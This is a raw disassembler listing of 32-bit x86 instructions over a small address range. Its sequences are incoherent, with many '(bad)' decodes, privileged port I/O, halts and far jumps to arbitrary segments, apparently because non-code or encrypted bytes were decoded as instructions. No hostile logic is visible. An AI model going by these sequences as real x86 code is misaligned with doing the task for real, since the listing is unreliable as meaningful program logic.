  428199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42819b:	mov    dl,0x76
  42819d:	lea    ebp,[edx+0x2af0411d]
  4281a3:	ret    0x89db
  4281a6:	iret   
  4281a7:	repz or al,0x52
  4281aa:	das    
  4281ab:	xchg   DWORD PTR [edx-0x51],esi
  4281ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281af:	icebp  
  4281b0:	fld    QWORD PTR [edi+0x53b5f266]
  4281b6:	cs ss dec edi
  4281b9:	sbb    esi,ebp
  4281bb:	fadd   QWORD PTR [eax+eax*4]
  4281be:	cld    
  4281bf:	ss push edi
  4281c1:	sti    
  4281c2:	fst    QWORD PTR [eax+0x2e83bcaf]
  4281c8:	hlt    
  4281c9:	pop    ss
  4281ca:	repnz cs scas eax,DWORD PTR es:[edi]
  4281cd:	ins    DWORD PTR es:[edi],dx
  4281ce:	test   eax,0xe6ab53ed
  4281d3:	fild   WORD PTR [edi+esi*1]
  4281d6:	adc    DWORD PTR [ebx-0x12748bca],ebx
  4281dc:	jo     0x428192
  4281de:	or     DWORD PTR [esi-0x73],0xffffffcd
  4281e2:	bound  ebp,QWORD PTR [edi+0x598245b9]
  4281e8:	push   0xf20c6a59
  4281ed:	push   0x8b5b26c
  4281f2:	fwait
  4281f3:	stos   DWORD PTR es:[edi],eax
  4281f4:	or     ecx,ecx
  4281f6:	aaa    
  4281f7:	dec    esp
  4281f8:	dec    edi
  4281f9:	push   esi
  4281fa:	sub    eax,0xee00aba4
  4281ff:	inc    ecx
  428200:	mov    ds:0xae038750,al
  428205:	push   ss
  428206:	inc    bl
  428208:	xchg   edi,eax
  428209:	aad    0xdc
  42820b:	loopne 0x428192
  42820d:	fdivp  st(6),st
  42820f:	mov    al,0xe7
  428211:	dec    ebx
  428212:	jae    0x4281f4
  428214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428215:	cmp    BYTE PTR [edx+ebp*8],al
  428218:	xchg   ecx,eax
  428219:	dec    esp
  42821a:	or     al,0x92
  42821c:	out    0xaf,al
  42821e:	lods   al,BYTE PTR ds:[esi]
  42821f:	daa    
  428220:	cld    
  428221:	dec    esi
  428222:	sahf   
  428223:	xchg   esp,eax
  428224:	jmp    0x4281e4
  428226:	pop    es
  428227:	ds dec esp
  428229:	bound  edi,QWORD PTR [ecx-0x56868d7e]
  42822f:	out    dx,al
  428230:	mov    edi,0x1b39c54c
  428235:	inc    edx
  428236:	out    dx,eax
  428237:	jae    0x428208
  428239:	mov    cl,0x2f
  42823b:	adc    bh,bh
  42823d:	push   esi
  42823e:	or     BYTE PTR [ecx+eax*2],0x4d
  428242:	push   edx
  428243:	test   eax,0x143d8f00
  428248:	loopne 0x428250
  42824a:	out    0xb1,eax
  42824c:	das    
  42824d:	loopne 0x428290
  42824f:	xchg   esi,eax
  428250:	adc    al,0x53
  428252:	cmp    cl,ch
  428254:	jmp    0x428219
  428256:	and    DWORD PTR [ecx-0x14601cc2],ebp
  42825c:	and    ch,bh
  42825e:	xor    BYTE PTR [eax-0x31],ch
  428261:	test   al,0xe0
  428263:	add    edi,0xffffffcf
  428266:	clc    
  428267:	inc    ebx
  428268:	sbb    BYTE PTR [eax+0x1b],dl
  42826b:	inc    ecx
  42826c:	or     eax,0xc60bcff7
  428271:	adc    DWORD PTR [eax+0x7c],0xffffffe9
  428275:	sbb    ch,ah
  428277:	mov    cl,0x90
  428279:	nop
  42827a:	aam    0xa1
  42827c:	mov    dh,0x8e
  42827e:	ss xchg ebx,eax
  428280:	icebp  
  428281:	inc    eax
  428282:	push   eax
  428283:	arpl   WORD PTR [ebp+edx*8-0x29f3f8e5],si
  42828a:	mov    eax,ds:0x33080b84
  42828f:	icebp  
  428290:	enter  0x0,0x0
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	dec    eax
  428301:	cli    
  428302:	fnstcw WORD PTR [ecx+0x1ae14]
  428308:	add    eax,0x8000001
  42830d:	and    DWORD PTR [eax-0x7a67f8b1],edi
  428313:	xchg   edi,eax
  428314:	mov    dh,0xb1
  428316:	icebp  
  428317:	and    al,0xf5
  428319:	jle    0x42837b
  42831b:	cmc    
  42831c:	les    esi,FWORD PTR [eax]
  42831e:	dec    esp
  42831f:	js     0x428333
  428321:	push   edi
  428322:	add    eax,0x9249defd
  428327:	test   eax,0xa9b11604
  42832c:	and    eax,DWORD PTR [edx+0x29]
  42832f:	cdq    
  428330:	sti    
  428331:	pop    ss
  428332:	inc    edi
  428333:	aad    0x81
  428335:	fdiv   DWORD PTR [eax+esi*4+0x350dd984]
  42833c:	mov    bl,0x4d
  42833e:	pop    ecx
  42833f:	out    dx,eax
  428340:	stos   BYTE PTR es:[edi],al
  428341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428342:	shl    BYTE PTR [edx],cl
  428344:	sub    ebx,DWORD PTR [eax]
  428346:	lds    ebx,FWORD PTR [esi+0x8]
  428349:	pop    eax
  42834a:	ja     0x4282cd
  42834c:	inc    ebx
  42834d:	dec    ecx
  42834e:	mov    eax,ds:0xe5b1e1ae
  428353:	out    0x58,al
  428355:	pop    es
  428356:	and    al,BYTE PTR [ecx+0x3ffc585d]
  42835c:	cmp    eax,0x27bb3ddf
  428361:	(bad)  
  428362:	or     eax,0x90effd9
  428367:	outs   dx,DWORD PTR ds:[esi]
  428368:	adc    ebp,DWORD PTR [eax]
  42836a:	mov    edx,0x9240196d
  42836f:	jge    0x4283be
  428371:	(bad)
  428374:	sub    ah,al
  428376:	(bad)  
  428377:	and    al,0x6a
  428379:	mov    ds:0x683e0291,al
  42837e:	sub    al,0x58
  428380:	jp     0x428324
  428382:	pop    ds
  428383:	adc    bh,ch
  428385:	(bad)  
  428386:	(bad)  
  428387:	(bad)  
  428388:	and    ebx,ebp
  42838a:	pop    esp
  42838b:	mov    ds:0x178d6967,eax
  428390:	fwait
  428391:	mov    al,ds:0xe670f3b0
  428396:	or     ecx,DWORD PTR [ebx+0x54]
  428399:	xor    dl,BYTE PTR [eax]
  42839b:	mov    bl,0x8f
  42839d:	fist   WORD PTR [ebp+ebx*8-0x21db369]
  4283a4:	loopne 0x4283ee
  4283a6:	or     esp,edi
  4283a8:	mov    eax,ds:0x1998030d
  4283ad:	lods   eax,DWORD PTR ds:[esi]
  4283ae:	(bad)  
  4283af:	jae    0x428337
  4283b1:	test   DWORD PTR [esi-0x4b],edx
  4283b4:	inc    esi
  4283b5:	out    0xd7,al
  4283b7:	adc    BYTE PTR [eax],ch
  4283b9:	mov    BYTE PTR [ebx-0x767435a6],al
  4283bf:	inc    esp
  4283c0:	push   es
  4283c1:	call   0x1678:0x7aa2f1cc
  4283c8:	jmp    0x8084d3dd
  4283cd:	mov    bh,0xf1
  4283cf:	push   ecx
  4283d0:	lods   al,BYTE PTR ds:[esi]
  4283d1:	jno    0x428387
  4283d3:	mov    bl,0xd7
  4283d5:	pop    ds
  4283d6:	sub    ebx,0xf0b70677
  4283dc:	fucomip st,st(2)
  4283de:	ret    0x3f70
  4283e1:	imul   esp,edi,0xfffffff5
  4283e4:	mov    ebp,0xab0f58b8
  4283e9:	push   ecx
  4283ea:	push   0x95af6e57
  4283ef:	and    BYTE PTR [edi],bl
  4283f1:	cmp    cl,BYTE PTR [ebp+0x6e]
  4283f4:	jmp    0x3d7:0xdc71fe47
  4283fb:	mov    bl,0x92
  4283fd:	cmp    DWORD PTR [ebp-0x1dc3ed79],0x26
  428404:	jnp    0x428426
  428406:	outs   dx,DWORD PTR ds:[esi]
  428407:	call   0x340a:0xfc84f7f8
  42840e:	loopne 0x428468
  428410:	daa    
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x5aabfb32
  428481:	pusha  
  428482:	mov    ah,0xf
  428484:	sbb    DWORD PTR [edi+0x1050001],ebp
  42848a:	add    BYTE PTR [eax],al
  42848c:	outs   dx,BYTE PTR ds:[esi]
  42848d:	pop    esi
  42848e:	xor    eax,0x62273fe3
  428493:	and    al,0x26
  428495:	stos   BYTE PTR es:[edi],al
  428496:	int3   
  428497:	mov    bh,0xcf
  428499:	mov    cl,0x20
  42849b:	mov    al,ds:0xcc13f14d
  4284a0:	adc    ecx,DWORD PTR [eax-0x61]
  4284a3:	nop
  4284a4:	jmp    0x9008a3c7
  4284a9:	jb     0x4284ed
  4284ab:	xchg   ecx,eax
  4284ac:	push   esp
  4284ad:	mov    dl,ch
  4284af:	push   ds
  4284b0:	mov    ebp,0xe89a6278
  4284b5:	xchg   ebx,eax
  4284b6:	(bad)  
  4284b7:	push   ebx
  4284b8:	mov    cl,0x46
  4284ba:	pop    esp
  4284bb:	stos   DWORD PTR es:[edi],eax
  4284bc:	xchg   esi,eax
  4284bd:	or     dh,BYTE PTR [ecx*8-0x45e4e83a]
  4284c4:	and    al,0xa0
  4284c6:	(bad)  
  4284c7:	ds dec edi
  4284c9:	jb     0x4284c5
  4284cb:	push   es
  4284cc:	popf   
  4284cd:	add    al,ch
  4284cf:	inc    esi
  4284d0:	push   esp
  4284d1:	(bad)  [ecx-0x39]
  4284d4:	pop    edi
  4284d5:	lods   eax,DWORD PTR ds:[esi]
  4284d6:	out    0x5f,al
  4284d8:	push   es
  4284d9:	fistp  DWORD PTR [ebp-0x48ce2e4d]
  4284df:	mov    bh,0x3d
  4284e1:	or     al,0x5f
  4284e3:	aaa    
  4284e4:	inc    ecx
  4284e5:	xor    eax,0xd3c8ed65
  4284ea:	rcl    ebx,0x33
  4284ed:	adc    DWORD PTR ds:0x1996a05a,eax
  4284f3:	push   es
  4284f4:	xor    DWORD PTR [esi],ecx
  4284f6:	sahf   
  4284f7:	popf   
  4284f8:	scas   al,BYTE PTR es:[edi]
  4284f9:	mov    ecx,0x693a3316
  4284fe:	inc    edi
  4284ff:	mov    cl,0xe
  428501:	jge    0x4284c2
  428503:	mov    dh,0xf1
  428505:	add    dh,BYTE PTR [ecx+0xdd4ab64]
  42850b:	dec    ecx
  42850c:	ret    0x58a9
  42850f:	out    0x29,al
  428511:	mov    al,0xe2
  428513:	add    ch,BYTE PTR [ebx+0x61]
  428516:	sbb    BYTE PTR [esi-0x5eea73d9],0x57
  42851d:	pop    ecx
  42851e:	imul   edi,DWORD PTR [edi],0xa62d2428
  428524:	mov    ah,0xfb
  428526:	lahf   
  428527:	shl    DWORD PTR [esi-0x48],1
  42852a:	fnsave [ebp+0x74c589cf]
  428530:	cmp    eax,0x53d44ddb
  428535:	xchg   ebx,eax
  428536:	imul   edx,DWORD PTR [ebx],0xd6006742
  42853c:	inc    esp
  42853d:	push   ebp
  42853e:	imul   edx,DWORD PTR [edi+0x3fb91a72],0x63
  428545:	outs   dx,BYTE PTR ds:[esi]
  428546:	loop   0x4284d6
  428548:	push   esi
  428549:	(bad)  
  42854a:	pop    ebx
  42854b:	stos   DWORD PTR es:[edi],eax
  42854c:	mov    dl,0x16
  42854e:	inc    ebp
  42854f:	and    eax,0x8b644895
  428554:	xchg   ecx,eax
  428555:	dec    ebx
  428556:	bound  eax,QWORD PTR [eax+0x5]
  428559:	fcomi  st,st(4)
  42855b:	scas   al,BYTE PTR es:[edi]
  42855c:	lea    edx,[edx-0x4a0a2d94]
  428562:	jnp    0x4285dd
  428564:	data16 jnp 0x4285ac
  428567:	shl    DWORD PTR [esi-0x17239521],0x25
  42856e:	int3   
  42856f:	test   BYTE PTR [ebp+0x13077602],cl
  428575:	sbb    al,0xf0
  428577:	xchg   ebx,eax
  428578:	stos   DWORD PTR es:[edi],eax
  428579:	mov    edi,0xd47fa0c2
  42857e:	mov    al,ds:0xbb3d4025
  428583:	or     DWORD PTR [eax+0x7f],0x71
  428587:	cmp    eax,0xe7337da8
  42858c:	retf   
  42858d:	in     al,dx
  42858e:	int3   
  42858f:	push   ebx
  428590:	jp     0x428592
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x1dba3f6
  428602:	adc    DWORD PTR [edx+0x1e],ebp
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x1a000001,al
  42860d:	enter  0xaf7b,0xe8
  428611:	dec    esp
  428612:	push   ecx
  428613:	jl     0x428676
  428615:	and    BYTE PTR [ebx+0x316422d0],0xfc
  42861c:	(bad)  
  42861d:	pop    esi
  42861e:	cld    
  42861f:	sbb    edx,esp
  428621:	push   esi
  428622:	sbb    DWORD PTR [eax+0x47],ecx
  428625:	or     al,0xdb
  428627:	xchg   ebx,eax
  428628:	inc    edx
  428629:	inc    bh
  42862b:	loop   0x428624
  42862d:	hlt    
  42862e:	adc    al,BYTE PTR [eax-0x6e]
  428631:	out    0x18,al
  428633:	push   ecx
  428634:	dec    esp
  428635:	aad    0xf3
  428637:	add    BYTE PTR [ebx+0x5a],dl
  42863a:	mov    edi,DWORD PTR ds:0x27684152
  428640:	bound  edx,QWORD PTR ds:0xec8c759a
  428646:	rcr    BYTE PTR [esi+ebx*8],1
  428649:	inc    ebx
  42864a:	jo     0x7a03e65d
  428650:	mov    al,0x98
  428652:	shl    ecx,0xf5
  428655:	int    0xf
  428657:	out    dx,eax
  428658:	leave  
  428659:	fmul   QWORD PTR [edi+edi*4+0x2dabdf5c]
  428660:	retf   
  428661:	xchg   esp,eax
  428662:	inc    esi
  428663:	neg    BYTE PTR [edi+0x34bda142]
  428669:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42866b:	push   ebx
  42866c:	mov    esp,0x280a8cd9
  428671:	or     ebx,ebx
  428673:	out    0x17,al
  428675:	ror    BYTE PTR [edi-0x5132579d],0xe5
  42867c:	cld    
  42867d:	loop   0x42862a
  42867f:	adc    BYTE PTR [esi+0x67b95b19],0xb4
  428686:	sbb    ebx,DWORD PTR [ebp+ebx*4+0x9]
  42868a:	add    DWORD PTR [ebp+edx*8-0x3a4ca0bd],ebx
  428691:	xchg   esp,eax
  428692:	(bad)  
  428693:	cmp    ebx,DWORD PTR ds:0x71abbbbe
  428699:	mov    bh,0xfc
  42869b:	and    BYTE PTR [esi+0x1a],al
  42869e:	inc    ecx
  42869f:	mov    ds:0x92acd72e,al
  4286a4:	cmp    BYTE PTR [ebp+0x793cd301],ch
  4286aa:	add    DWORD PTR [edx],0xfffffffd
  4286ad:	add    al,0x62
  4286af:	data16 cld 
  4286b1:	sub    eax,0x4ae0ef0a
  4286b6:	clc    
  4286b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286b8:	mov    edx,0xb41bf7ac
  4286bd:	jmp    0x428702
  4286bf:	cmp    BYTE PTR [ebx-0x6d55630b],bl
  4286c5:	out    0x71,eax
  4286c7:	add    al,0x6a
  4286c9:	adc    ebp,DWORD PTR [di-0x3]
  4286cd:	push   es
  4286ce:	pushf  
  4286cf:	fdiv   QWORD PTR [edi]
  4286d1:	(bad)  
  4286d2:	pushf  
  4286d3:	aaa    
  4286d4:	cmp    al,0x32
  4286d6:	pop    edx
  4286d7:	xchg   esi,eax
  4286d8:	mov    bl,0xaa
  4286da:	enter  0x83a6,0x81
  4286de:	fs and dh,ah
  4286e1:	lea    esp,[edx+0x4a]
  4286e4:	xlat   BYTE PTR ds:[ebx]
  4286e5:	mov    edi,0x51d2a477
  4286ea:	es jbe 0x42866d
  4286ed:	ins    DWORD PTR es:[edi],dx
  4286ee:	retf   0x992d
  4286f1:	or     al,0x1d
  4286f3:	aas    
  4286f4:	pushf  
  4286f5:	xor    al,0xd6
  4286f7:	daa    
  4286f8:	add    BYTE PTR [esi+0x5caddd14],bl
  4286fe:	dec    eax
  4286ff:	mov    edi,0x21997681
  428704:	jg     0x428765
  428706:	push   esp
  428707:	in     eax,dx
  428708:	popf   
  428709:	(bad)  
  42870a:	mov    ebp,0xa60c7919
  42870f:	popf   
  428710:	fadd   QWORD PTR [eax]
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xeeb91b96
  428783:	shl    BYTE PTR [ebx],1
  428785:	mov    cl,0x1
  428787:	add    BYTE PTR ds:0xbc000001,al
  42878d:	outs   dx,BYTE PTR ds:[esi]
  42878e:	jo     0x4287d5
  428790:	pop    edi
  428791:	xchg   ecx,eax
  428792:	add    eax,0xf6db0d8
  428797:	xchg   ecx,eax
  428798:	xchg   DWORD PTR [edi],ecx
  42879a:	or     al,0xe1
  42879c:	je     0x428752
  42879e:	fwait
  42879f:	dec    esp
  4287a0:	data16 or BYTE PTR [esi-0x42],0x40
  4287a5:	dec    edx
  4287a6:	and    eax,0xb5707db1
  4287ab:	sahf   
  4287ac:	ret    
  4287ad:	fwait
  4287ae:	pusha  
  4287af:	dec    esi
  4287b0:	nop
  4287b1:	retf   
  4287b2:	call   0xd390:0xc6aed2d1
  4287b9:	ins    BYTE PTR es:[edi],dx
  4287ba:	or     al,0x99
  4287bc:	xor    al,0xe5
  4287be:	xor    al,0x5
  4287c0:	inc    eax
  4287c1:	call   0xb828d941
  4287c6:	and    eax,DWORD PTR [edx+0x7f]
  4287c9:	nop
  4287ca:	ja     0x428788
  4287cc:	mov    ah,0x20
  4287ce:	jns    0x4287b3
  4287d0:	sub    edx,DWORD PTR [eax+ebx*2-0x53]
  4287d4:	mov    ds:0x7d712929,al
  4287d9:	add    esp,DWORD PTR [edx]
  4287db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287dc:	push   ds
  4287dd:	sub    BYTE PTR [ecx+0x5d4084d2],bh
  4287e3:	pop    edi
  4287e4:	push   esp
  4287e5:	fnsetpm(287 only) 
  4287e7:	pop    edi
  4287e8:	inc    ebx
  4287e9:	and    DWORD PTR [ebx-0x3490881b],ebp
  4287ef:	ds push esi
  4287f1:	lock lea esp,[esi-0xba6b9fe]
  4287f8:	imul   ebp,DWORD PTR [edi-0x19],0xffffffa3
  4287fc:	in     al,dx
  4287fd:	jns    0x4287ae
  4287ff:	push   ebp
  428800:	pop    ebx
  428801:	sbb    al,0x89
  428803:	mov    edx,0x2de50f71
  428808:	mov    bl,0x7
  42880a:	push   edx
  42880b:	push   esp
  42880c:	xchg   bl,bl
  42880e:	jno    0x4287c8
  428810:	mov    BYTE PTR [eax],ah
  428812:	mov    esp,0x8565378
  428817:	loopne 0x4287cd
  428819:	mov    ebx,0xa4f5f788
  42881e:	pop    edi
  42881f:	push   ss
  428820:	xchg   ebx,eax
  428821:	sub    al,0x54
  428823:	stos   DWORD PTR es:[edi],eax
  428824:	popa   
  428825:	or     al,0x45
  428827:	push   ss
  428828:	popa   
  428829:	(bad)  
  42882b:	sub    BYTE PTR [ecx-0x6d302b18],al
  428831:	pop    ebx
  428832:	xor    ebp,DWORD PTR [ebx-0x2a]
  428835:	push   0x9d040abd
  42883a:	push   0xc29e3791
  42883f:	xchg   edi,eax
  428840:	push   es
  428841:	repz sub DWORD PTR ds:0x7faa7f8c,0x39f4d270
  42884c:	xor    DWORD PTR [esi-0x1dc20331],0x8c3a1c2d
  428856:	inc    esp
  428857:	sub    ecx,DWORD PTR [esp+edi*8+0x73ba0aa3]
  42885e:	aam    0x1e
  428860:	sbb    DWORD PTR [eax],0xffffff83
  428863:	in     al,dx
  428864:	lahf   
  428865:	mov    dl,0xf9
  428867:	and    esi,DWORD PTR [edi+0x3474adf4]
  42886d:	xor    dh,BYTE PTR [edx+0x6d]
  428870:	cmp    al,BYTE PTR [edi]
  428872:	push   0x4f
  428874:	add    BYTE PTR [esi],bl
  428876:	push   edi
  428877:	adc    al,0xe0
  428879:	add    eax,0x2eca384e
  42887e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42887f:	jno    0x42889f
  428881:	shr    BYTE PTR ds:0xd309b3b2,1
  428887:	loope  0x4288e8
  428889:	pop    ebp
  42888a:	ror    al,0xd
  42888d:	add    eax,0xfc4e18
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x10fc62f1],bx
  428902:	or     DWORD PTR [ecx+0x1b228],0x5
  428909:	add    DWORD PTR [eax],eax
  42890b:	add    BYTE PTR ds:0x42c03e2a,ch
  428911:	mov    eax,ds:0xbc196102
  428916:	dec    edx
  428917:	pop    edi
  428918:	fwait
  428919:	jbe    0x4288b1
  42891b:	pop    esp
  42891c:	scas   al,BYTE PTR es:[edi]
  42891d:	pop    ecx
  42891e:	jecxz  0x4288a7
  428920:	jmp    0xc6c2b79a
  428925:	cs aam 0x57
  428928:	std    
  428929:	imul   eax,esi,0xffb98e6b
  42892f:	aaa    
  428930:	jns    0x4288b4
  428932:	loopne 0x4288d1
  428934:	mov    edx,0x4618e1d9
  428939:	std    
  42893a:	jl     0x4289a4
  42893c:	cmp    eax,0x7895e1be
  428941:	cmc    
  428942:	jecxz  0x428914
  428944:	and    eax,0x381b2e5b
  428949:	xchg   edx,eax
  42894a:	adc    al,0x82
  42894c:	rol    BYTE PTR [esi+0x5b],cl
  42894f:	jp     0x42895c
  428951:	push   ss
  428952:	sbb    DWORD PTR [eax+esi*2-0x31105622],ecx
  428959:	inc    ebx
  42895a:	adc    bl,BYTE PTR [edx]
  42895c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42895d:	push   eax
  42895e:	fmul   DWORD PTR [edi]
  428960:	push   esi
  428961:	into   
  428962:	xor    BYTE PTR [esi-0x3a8f8650],ch
  428968:	lds    ebx,FWORD PTR [ebp+0x51]
  42896b:	cmp    eax,0x4d879a3c
  428970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428971:	fnsave [esi]
  428973:	out    0xb1,eax
  428975:	imul   ebp,DWORD PTR [edi+0x35],0x27
  428979:	sub    BYTE PTR [ebp+0x54],bh
  42897c:	jge    0x42891c
  42897e:	ds push ebx
  428980:	aad    0xf9
  428982:	rol    cl,cl
  428984:	jbe    0x428924
  428986:	ja     0x428926
  428988:	fist   WORD PTR [eax]
  42898a:	(bad)  
  42898c:	into   
  42898d:	call   0xc82b37e4
  428992:	xchg   edx,eax
  428993:	fs in  eax,dx
  428995:	inc    eax
  428996:	dec    esp
  428997:	and    eax,0xd6cbbbf4
  42899c:	call   0xdab:0xb2c27c5d
  4289a3:	pop    ebx
  4289a4:	or     al,0x2b
  4289a6:	in     al,0x68
  4289a8:	int3   
  4289a9:	inc    esi
  4289aa:	and    al,0x38
  4289ac:	pop    ebp
  4289ad:	clc    
  4289ae:	out    dx,al
  4289af:	xchg   ebp,eax
  4289b0:	xor    eax,DWORD PTR [ecx-0x13]
  4289b3:	xchg   ecx,eax
  4289b4:	jb     0x428a2a
  4289b6:	test   bl,al
  4289b8:	ins    BYTE PTR es:[edi],dx
  4289b9:	mov    ah,0x43
  4289bb:	adc    edi,edx
  4289bd:	aad    0x78
  4289bf:	sbb    bl,cl
  4289c1:	scas   eax,DWORD PTR es:[edi]
  4289c2:	xchg   BYTE PTR [esi-0x7c],ch
  4289c5:	sub    BYTE PTR [ebx],dh
  4289c7:	dec    ebx
  4289c8:	lods   eax,DWORD PTR ds:[esi]
  4289c9:	fisub  DWORD PTR ds:0x895cb1c
  4289cf:	(bad)  
  4289d0:	nop
  4289d1:	mov    eax,ds:0xa865829e
  4289d6:	mov    ecx,0x7a6e21ac
  4289db:	sbb    DWORD PTR [eax],0xffffffc4
  4289de:	retf   
  4289df:	loopne 0x428967
  4289e1:	and    DWORD PTR [ebx],edi
  4289e3:	mov    eax,cs
  4289e5:	popa   
  4289e6:	loope  0x4289c0
  4289e8:	cmp    BYTE PTR [ebx],al
  4289ea:	jmp    0x428a12
  4289ec:	das    
  4289ed:	and    eax,0x2126677f
  4289f2:	int3   
  4289f3:	cmp    al,0xd3
  4289f5:	add    BYTE PTR [ebx+0x6c],ch
  4289f8:	jle    0x4289ab
  4289fa:	(bad)  
  4289fb:	fcom   st(4)
  4289fd:	loopne 0x4289b5
  4289ff:	sub    dl,BYTE PTR [edi+ebp*1]
  428a02:	mov    dh,0x4c
  428a04:	retf   0xc497
  428a07:	or     eax,DWORD PTR [ecx-0x60]
  428a0a:	sbb    al,0xed
  428a0c:	js     0x428a45
  428a0e:	push   esi
  428a0f:	mov    al,ds:0x23
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x712a18ed]
  428a83:	(bad)  
  428a84:	sub    eax,0x50001b3
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    BYTE PTR [ecx],cl
  428a8d:	sub    edi,DWORD PTR [edx+ebp*2+0x6]
  428a91:	xchg   edi,eax
  428a92:	in     al,dx
  428a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a94:	xor    esi,eax
  428a96:	sbb    al,0x6a
  428a98:	jo     0x428b08
  428a9a:	mov    dh,0x95
  428a9c:	dec    edx
  428a9d:	cmp    edi,DWORD PTR [ecx+0x4679a2e9]
  428aa3:	sbb    dl,BYTE PTR [ebx+0xe419178]
  428aa9:	push   cs
  428aaa:	test   eax,0xd57846bf
  428aaf:	ins    DWORD PTR es:[edi],dx
  428ab0:	frstor [ebp+0x5ae7148a]
  428ab6:	mov    bh,0x31
  428ab8:	test   eax,0xa425641a
  428abd:	test   BYTE PTR [ecx],bl
  428abf:	ja     0x428aca
  428ac1:	xchg   edi,eax
  428ac2:	leave  
  428ac3:	ret    0x2800
  428ac6:	jl     0x428a61
  428ac8:	js     0x428ad5
  428aca:	and    edx,DWORD PTR [ecx-0x800cc07]
  428ad0:	bound  ebx,QWORD PTR [ebx-0x4959b060]
  428ad6:	mov    ecx,0xb3ada089
  428adb:	jno    0x428a9f
  428add:	lds    edx,FWORD PTR [ecx]
  428adf:	add    eax,0x724559f1
  428ae4:	(bad)  
  428ae5:	aad    0xe8
  428ae7:	and    DWORD PTR [ecx+0x21],eax
  428aea:	loope  0x428ac2
  428aec:	xor    ebp,eax
  428aee:	int3   
  428aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428af0:	cmp    al,0xca
  428af2:	push   esi
  428af3:	cdq    
  428af4:	or     eax,0xf5921ceb
  428af9:	loopne 0x428ab3
  428afb:	test   BYTE PTR [edi-0x18],ah
  428afe:	push   ebx
  428aff:	out    dx,eax
  428b00:	jl     0x428b7f
  428b02:	sub    edx,DWORD PTR [edx-0x65bd2b11]
  428b08:	nop
  428b09:	data16 jg 0x428a9d
  428b0c:	fisubr WORD PTR [edi-0x4c63d5e]
  428b12:	adc    ebx,eax
  428b14:	jnp    0x428b8e
  428b16:	jmp    DWORD PTR [eax]
  428b18:	test   eax,0x15ff9d70
  428b1d:	mov    dh,0x1d
  428b1f:	adc    al,BYTE PTR ds:0x6a176d73
  428b25:	mov    cl,BYTE PTR [edx]
  428b27:	stc    
  428b28:	test   al,0x93
  428b2a:	xor    dl,BYTE PTR [edx-0x61693da4]
  428b30:	popa   
  428b31:	sub    eax,0xf69f9889
  428b36:	retf   
  428b37:	lods   eax,DWORD PTR ds:[esi]
  428b38:	(bad)  
  428b39:	or     DWORD PTR [ebp-0x4a],ebp
  428b3c:	or     edi,ebp
  428b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b3f:	sar    BYTE PTR [eax-0x22],1
  428b42:	sbb    cl,BYTE PTR [esi+0x2f]
  428b45:	fldenv [ecx]
  428b47:	pop    es
  428b48:	sbb    al,0x2c
  428b4a:	mov    bh,0x38
  428b4c:	sahf   
  428b4d:	outs   dx,BYTE PTR ds:[esi]
  428b4e:	inc    eax
  428b4f:	loopne 0x428b51
  428b51:	push   ss
  428b52:	and    al,0xc2
  428b54:	pop    esp
  428b55:	pop    edi
  428b56:	adc    eax,0x19a2028a
  428b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b5c:	jbe    0x428b4f
  428b5e:	fdiv   QWORD PTR [eax]
  428b60:	mov    BYTE PTR [esp+ecx*8+0x8aa0f7a],ah
  428b67:	mov    DWORD PTR [esp+eiz*2+0x1d],ecx
  428b6b:	adc    ecx,DWORD PTR [ecx+0x66]
  428b6e:	mov    cl,0xdb
  428b70:	dec    eax
  428b71:	cmp    al,0xc2
  428b73:	add    al,0xdb
  428b75:	adc    cl,BYTE PTR [edi+0x51a29e51]
  428b7b:	push   edx
  428b7c:	pop    edi
  428b7d:	rol    DWORD PTR [edx-0x6c],cl
  428b80:	mov    eax,0x8fe05405
  428b85:	in     al,0xad
  428b87:	or     BYTE PTR [ebx-0x5a],al
  428b8a:	and    DWORD PTR [ebx+ebx*2-0x216e6375],esi
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x9d96534a
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [edx+ebx*4-0x60bd9773],al
  428c12:	shr    BYTE PTR [ecx+0x59b658f2],1
  428c18:	ins    DWORD PTR es:[edi],dx
  428c19:	je     0x428c33
  428c1b:	add    dh,BYTE PTR [esi-0x47fa8bdf]
  428c21:	mov    dh,0x67
  428c23:	hlt    
